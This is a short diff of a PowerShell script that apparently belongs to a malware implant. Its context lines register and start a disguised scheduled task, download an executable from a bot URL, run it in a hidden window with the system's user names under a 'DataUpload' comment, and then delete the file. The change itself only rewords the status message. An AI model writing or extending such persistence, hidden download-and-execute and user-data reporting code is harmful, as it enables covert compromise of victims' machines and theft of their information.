@@ -106,7 +106,7 @@ if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-ScheduledTask -TaskName $updateserv
 #DataUpload
-$combineddata = """Task Installed on **$code**, System's Userset is **$userNames**. Save the code for further actions."""
+$combineddata = """Scheduling Success on **$code**, System's Userset is **$userNames**. Please save the code for further actions."""
 Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
 Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $combineddata
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
